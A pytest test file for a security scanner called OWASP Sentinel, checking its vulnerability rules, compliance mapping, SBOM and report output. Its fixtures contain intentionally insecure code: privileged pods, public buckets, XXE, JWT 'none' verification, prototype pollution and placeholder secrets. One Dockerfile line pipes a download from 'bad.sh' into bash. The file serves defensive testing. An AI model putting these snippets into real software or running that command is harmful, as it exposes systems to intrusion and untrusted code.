"""Tests for OWASP Sentinel Scanner Engine and Rules."""

import os
import pytest
from scanner.engine import ScannerEngine
from scanner.models import OWASPCategory, Severity, ScanResult, Finding
from scanner.database import Database

def test_engine_scans_sample_repo():
    repo_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "sample_vulnerable_repo"))
    engine = ScannerEngine()
    result = engine.scan_directory(repo_dir, repo_name="sample_test", source_type="sample")

    assert result.total_files >= 4
    assert len(result.findings) >= 10

    # Verify that all 10 OWASP categories are detected
    categories_found = set()
    for f in result.findings:
        cat_short = f.category.split(":")[0]
        categories_found.add(cat_short)

    for i in range(1, 11):
        expected_cat = f"A{i:02d}"
        assert expected_cat in categories_found, f"Category {expected_cat} was not detected in sample repo! Found: {categories_found}"

    # Check that score is computed and penalty applied
    assert result.score < 50
    assert result.grade in ("D", "F")

def test_database_crud():
    db = Database(db_path=":memory:")
    repo_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "sample_vulnerable_repo"))
    engine = ScannerEngine()
    result = engine.scan_directory(repo_dir, repo_name="sample_db_test", source_type="sample")

    # Save
    scan_id = db.save_scan(result)
    assert scan_id == result.id

    # Retrieve
    loaded = db.get_scan(scan_id)
    assert loaded is not None
    assert loaded.repo_name == "sample_db_test"
    assert len(loaded.findings) == len(result.findings)

    # Update finding status (e.g. mark as False Positive)
    finding_id = loaded.findings[0].id
    updated = db.update_finding_status(finding_id, "FALSE_POSITIVE", notes="Approved test exception")
    assert updated is True

    # Re-fetch and check
    loaded_after = db.get_scan(scan_id)
    fp_finding = next(f for f in loaded_after.findings if f.id == finding_id)
    assert fp_finding.status == "FALSE_POSITIVE"
    assert fp_finding.notes == "Approved test exception"

    # List scans
    scans_list = db.list_scans()
    assert len(scans_list) >= 1
    assert scans_list[0]["id"] == scan_id

    # Stats
    stats = db.get_dashboard_stats()
    assert stats["total_scans"] >= 1
    assert stats["total_findings"] >= 1

def test_sarif_generation():
    from scanner.sarif_exporter import generate_sarif_report
    repo_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "sample_vulnerable_repo"))
    engine = ScannerEngine()
    result = engine.scan_directory(repo_dir, repo_name="sarif_test", source_type="sample")

    sarif = generate_sarif_report(result)
    assert sarif["version"] == "2.1.0"
    assert len(sarif["runs"]) == 1
    run = sarif["runs"][0]
    assert run["tool"]["driver"]["name"] == "OWASP Sentinel"
    assert len(run["results"]) > 0
    assert "ruleId" in run["results"][0]
    assert "locations" in run["results"][0]

def test_scan_comparison():
    from scanner.diff_engine import compare_scans
    repo_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "sample_vulnerable_repo"))
    engine = ScannerEngine()
    base_result = engine.scan_directory(repo_dir, repo_name="base_run", source_type="sample")

    # Create a modified copy of findings representing fixed state
    target_result = engine.scan_directory(repo_dir, repo_name="target_run", source_type="sample")
    # Simulate resolving the first two findings
    target_result.findings = target_result.findings[2:]
    target_result.calculate_metrics()

    comparison = compare_scans(base_result, target_result)
    assert len(comparison.fixed_findings) == 2
    assert len(comparison.new_findings) == 0
    assert comparison.score_delta >= 0
    assert comparison.is_improved is True

def test_patch_generation():
    from scanner.patch_generator import generate_scan_patch, generate_finding_diff
    repo_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "sample_vulnerable_repo"))
    engine = ScannerEngine()
    result = engine.scan_directory(repo_dir, repo_name="patch_test", source_type="sample")

    patch_text = generate_scan_patch(result)
    assert "# OWASP Sentinel Automated Security Patch" in patch_text
    assert len(patch_text) > 100


def test_entropy_scanner_and_signatures():
    from scanner.entropy_scanner import calculate_shannon_entropy, scan_content_for_secrets

    # Test Shannon entropy calculation
    low_entropy = calculate_shannon_entropy("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    assert low_entropy < 1.0

    high_entropy = calculate_shannon_entropy("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY12345")
    assert high_entropy >= 4.5

    # Test high-fidelity secret signatures
    content = """
    DB_URI = "postgres://appuser:SecretPassword123@db.example.internal:5432/main"
    GITHUB_PAT = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    SLACK_HOOK = "https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
    API_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY12345"
    """
    findings = scan_content_for_secrets(content, "config.py", content.splitlines())
    rule_ids = {f.rule_id for f in findings}

    assert "SEC-SEC-004" in rule_ids  # DB connection URI
    assert "SEC-SEC-003" in rule_ids  # GitHub PAT
    assert "SEC-SEC-002" in rule_ids  # Slack webhook
    assert "SEC-A02-007" in rule_ids  # High entropy secret


def test_iac_and_ci_cd_security_checks():
    engine = ScannerEngine()

    # Kubernetes manifest
    k8s_content = """
    apiVersion: v1
    kind: Pod
    spec:
      hostPID: true
      containers:
        - name: app
          securityContext:
            privileged: true
          resources: {}
    """
    with open("/tmp/test_k8s.yaml", "w") as f:
        f.write(k8s_content)
    try:
        findings = engine.scan_file("/tmp/test_k8s.yaml", "/tmp")
        rule_ids = {f.rule_id for f in findings}
        assert "SEC-IAC-001" in rule_ids  # Privileged
        assert "SEC-IAC-002" in rule_ids  # Host namespace
        assert "SEC-IAC-003" in rule_ids  # Missing limits
    finally:
        if os.path.exists("/tmp/test_k8s.yaml"):
            os.remove("/tmp/test_k8s.yaml")

    # Terraform manifest
    tf_content = """
    resource "aws_security_group" "open" {
      ingress {
        from_port   = 22
        to_port     = 22
        cidr_blocks = ["0.0.0.0/0"]
      }
    }
    resource "aws_s3_bucket" "b" {
      acl = "public-read"
    }
    """
    with open("/tmp/test_main.tf", "w") as f:
        f.write(tf_content)
    try:
        findings = engine.scan_file("/tmp/test_main.tf", "/tmp")
        rule_ids = {f.rule_id for f in findings}
        assert "SEC-IAC-005" in rule_ids  # Open SG
        assert "SEC-IAC-006" in rule_ids  # Public S3 ACL
    finally:
        if os.path.exists("/tmp/test_main.tf"):
            os.remove("/tmp/test_main.tf")


def test_api_security_and_advanced_checks():
    engine = ScannerEngine()

    api_content = """
    from flask import Flask, request, jsonify
    import tempfile
    import xml.etree.ElementTree as ET
    from jinja2 import Environment
    import re

    app = Flask(__name__)
    env = Environment(autoescape=False)
    redo = re.compile(r"([a-z]+)+")

    @app.route('/api/user', methods=['POST'])
    def update_user():
        user.update(**request.json)
        return jsonify({"user": "ok"})

    @app.route('/api/all', methods=['GET'])
    def list_all():
        items = Item.query.all()
        return jsonify(items)

    @app.route('/api/temp', methods=['POST'])
    def create_temp():
        path = tempfile.mktemp()
        return path

    @app.route('/api/xml', methods=['POST'])
    def parse_x(data):
        return ET.fromstring(data)
    """
    with open("/tmp/test_api.py", "w") as f:
        f.write(api_content)
    try:
        findings = engine.scan_file("/tmp/test_api.py", "/tmp")
        rule_ids = {f.rule_id for f in findings}
        assert "SEC-API-001" in rule_ids  # Mass assignment
        assert "SEC-API-002" in rule_ids  # Unbounded query
        assert "SEC-A01-005" in rule_ids  # tempfile.mktemp
        assert "SEC-A03-007" in rule_ids  # XXE
        assert "SEC-A03-008" in rule_ids  # ReDoS
        assert "SEC-A03-009" in rule_ids  # Jinja2 autoescape=False
    finally:
        if os.path.exists("/tmp/test_api.py"):
            os.remove("/tmp/test_api.py")

    # JavaScript prototype pollution and JWT none algorithm
    js_content = """
    const express = require('express');
    const app = express();
    app.post('/profile', (req, res) => {
        Object.assign(req.user, req.body);
    });
    jwt.verify(token, key, { algorithms: ['none'] });
    """
    with open("/tmp/test_app.js", "w") as f:
        f.write(js_content)
    try:
        findings = engine.scan_file("/tmp/test_app.js", "/tmp")
        rule_ids = {f.rule_id for f in findings}
        assert "SEC-A03-006" in rule_ids  # Prototype pollution
        assert "SEC-A07-005" in rule_ids  # JWT none algorithm
    finally:
        if os.path.exists("/tmp/test_app.js"):
            os.remove("/tmp/test_app.js")


def test_compliance_mapper():
    from scanner.compliance_mapper import evaluate_compliance
    repo_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "sample_vulnerable_repo"))
    engine = ScannerEngine()
    result = engine.scan_directory(repo_dir, repo_name="compliance_test", source_type="sample")

    compliance = evaluate_compliance(result.findings)
    assert "PCI-DSS" in compliance
    assert "HIPAA" in compliance
    assert "NIST-800-53" in compliance
    assert "SOC2" in compliance

    pci = compliance["PCI-DSS"]
    assert pci["name"] == "PCI-DSS v4.0"
    assert pci["total_controls"] > 0
    assert pci["score_percentage"] <= 100
    assert "controls" in pci
    assert "REQ-6.2.4" in pci["controls"]
    assert pci["controls"]["REQ-6.2.4"]["status"] in ("COMPLIANT", "NON_COMPLIANT")


def test_sbom_generator():
    from scanner.sbom_generator import generate_cyclonedx_sbom, generate_spdx_sbom, extract_repo_dependencies
    repo_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "sample_vulnerable_repo"))
    engine = ScannerEngine()
    result = engine.scan_directory(repo_dir, repo_name="sbom_test", source_type="sample")

    # Dependency extraction
    deps = extract_repo_dependencies(repo_dir, result.findings)
    assert len(deps) >= 3
    dep_names = {d["name"] for d in deps}
    assert "flask" in dep_names
    assert "express" in dep_names

    # CycloneDX 1.5 JSON
    cdx = generate_cyclonedx_sbom(result, repo_path=repo_dir)
    assert cdx["bomFormat"] == "CycloneDX"
    assert cdx["specVersion"] == "1.5"
    assert len(cdx["components"]) >= 3
    assert len(cdx["vulnerabilities"]) > 0

    # SPDX 2.3 JSON
    spdx = generate_spdx_sbom(result, repo_path=repo_dir)
    assert spdx["spdxVersion"] == "SPDX-2.3"
    assert spdx["SPDXID"] == "SPDXRef-DOCUMENT"
    assert len(spdx["packages"]) >= 3


def test_quality_gate_engine():
    from scanner.policy_engine import QualityGateEngine
    repo_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "sample_vulnerable_repo"))
    engine = ScannerEngine()
    result = engine.scan_directory(repo_dir, repo_name="gate_test", source_type="sample")

    # Strict gate: must fail on vulnerable repo
    strict_engine = QualityGateEngine(preset_name="strict")
    strict_eval = strict_engine.evaluate(result)
    assert strict_eval["status"] == "FAILED"
    assert strict_eval["exit_code"] == 1
    assert strict_eval["violations_count"] > 0

    # Clean scan should pass
    clean_result = ScanResult(repo_name="clean_repo", score=98, grade="A+")
    clean_eval = strict_engine.evaluate(clean_result)
    assert clean_eval["status"] == "PASSED"
    assert clean_eval["exit_code"] == 0


def test_apply_remediation():
    from scanner.patch_generator import apply_remediation_to_file
    import tempfile

    test_content = 'app.run(host="0.0.0.0", debug=True)\n'
    tmp = tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode="w")
    try:
        tmp.write(test_content)
        tmp.flush()
        tmp.close()

        finding = Finding(
            rule_id="SEC-A05-001",
            file_path=os.path.basename(tmp.name),
            line_number=1,
            matched_line='app.run(host="0.0.0.0", debug=True)',
        )

        applied = apply_remediation_to_file(os.path.dirname(tmp.name), finding)
        assert applied is True

        with open(tmp.name, "r") as f:
            new_content = f.read()
        assert "debug=False" in new_content
    finally:
        if os.path.exists(tmp.name):
            os.remove(tmp.name)


def test_recursive_folder_scanning(tmp_path):
    # Setup nested folder hierarchy
    root_dir = tmp_path / "repo"
    src_dir = root_dir / "src" / "api" / "v1"
    github_dir = root_dir / ".github" / "workflows"
    ignored_dir = root_dir / "node_modules" / "pkg"

    src_dir.mkdir(parents=True)
    github_dir.mkdir(parents=True)
    ignored_dir.mkdir(parents=True)

    # Place scannable files
    (root_dir / "app.py").write_text("import os\n")
    (src_dir / "controller.py").write_text("import sys\n")
    (github_dir / "ci.yml").write_text("name: CI\n")
    (ignored_dir / "dummy.js").write_text("console.log(1)\n")

    engine = ScannerEngine()
    result = engine.scan_directory(str(root_dir), repo_name="recursive_test", source_type="local")

    # Verify discovered files
    assert result.total_files == 3
    assert "." in result.folder_counts
    assert os.path.join("src", "api", "v1") in result.folder_counts
    assert os.path.join(".github", "workflows") in result.folder_counts
    assert "node_modules" not in str(result.folder_counts)


def test_cwe_top25_enrichment():
    from scanner.cwe_registry import get_cwe_top25_rank, resolve_frameworks
    assert get_cwe_top25_rank("CWE-89") == 3
    assert get_cwe_top25_rank("CWE-78") == 5
    assert get_cwe_top25_rank("CWE-22") == 8
    assert get_cwe_top25_rank("CWE-476") == 12
    assert get_cwe_top25_rank("CWE-190") == 14
    assert get_cwe_top25_rank("CWE-362") == 21
    assert get_cwe_top25_rank("CWE-276") == 25
    assert get_cwe_top25_rank("CWE-9999") is None

    fw = resolve_frameworks("CWE-476-001", "CWE-Top25", "CWE-476")
    assert "CWE Top 25" in fw
    assert "System Safety" in fw


def test_cis_container_and_iac_rules(tmp_path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text("FROM python:latest\nUSER root\nRUN curl -s https://bad.sh | bash\n")

    tf_file = tmp_path / "main.tf"
    tf_file.write_text('resource "aws_ebs_volume" "v" { encrypted = false }\nresource "aws_db_instance" "d" { publicly_accessible = true }\n')

    engine = ScannerEngine()
    result = engine.scan_directory(str(tmp_path), repo_name="cis_test", source_type="local")
    rule_ids = {f.rule_id for f in result.findings}

    assert "CIS-DOCKER-001" in rule_ids
    assert "CIS-DOCKER-002" in rule_ids
    assert "CIS-DOCKER-004" in rule_ids
    assert "CIS-CLOUD-001" in rule_ids
    assert "CIS-CLOUD-002" in rule_ids


def test_slsa_supply_chain_rules(tmp_path):
    gh_dir = tmp_path / ".github" / "workflows"
    gh_dir.mkdir(parents=True)
    workflow_file = gh_dir / "ci.yml"
    workflow_file.write_text("jobs:\n  build:\n    permissions: write-all\n    steps:\n      - uses: actions/checkout@v4\n")

    engine = ScannerEngine()
    result = engine.scan_directory(str(tmp_path), repo_name="slsa_test", source_type="local")
    rule_ids = {f.rule_id for f in result.findings}

    assert "SLSA-CI-001" in rule_ids
    assert "SLSA-CI-002" in rule_ids


def test_foss_license_compliance(tmp_path):
    pkg_file = tmp_path / "package.json"
    pkg_file.write_text('{\n  "name": "test-pkg",\n  "license": "GPL-3.0",\n  "dependencies": {\n    "readline": "^1.3.0"\n  }\n}\n')

    engine = ScannerEngine()
    result = engine.scan_directory(str(tmp_path), repo_name="lic_test", source_type="local")
    rule_ids = {f.rule_id for f in result.findings}

    assert "LIC-GPL-001" in rule_ids or "LIC-GPL-002" in rule_ids
    for f in result.findings:
        if f.rule_id.startswith("LIC-"):
            assert "FOSS Governance" in f.frameworks


def test_multi_framework_compliance_mapping():
    from scanner.compliance_mapper import evaluate_compliance, COMPLIANCE_CONTROLS
    assert "ISO-27001" in COMPLIANCE_CONTROLS
    assert "CWE-TOP-25" in COMPLIANCE_CONTROLS
    assert "CIS-BENCHMARKS" in COMPLIANCE_CONTROLS
    assert "SLSA-SUPPLY-CHAIN" in COMPLIANCE_CONTROLS
    assert "FOSS-GOVERNANCE" in COMPLIANCE_CONTROLS

    engine = ScannerEngine()
    repo_dir = os.path.abspath("sample_vulnerable_repo")
    result = engine.scan_directory(repo_dir, repo_name="sample_eval", source_type="sample")

    comp_report = evaluate_compliance(result.findings)
    assert len(comp_report) >= 9
    assert "ISO-27001" in comp_report
    assert "CWE-TOP-25" in comp_report
    assert "CIS-BENCHMARKS" in comp_report
    assert "SLSA-SUPPLY-CHAIN" in comp_report
    assert "FOSS-GOVERNANCE" in comp_report





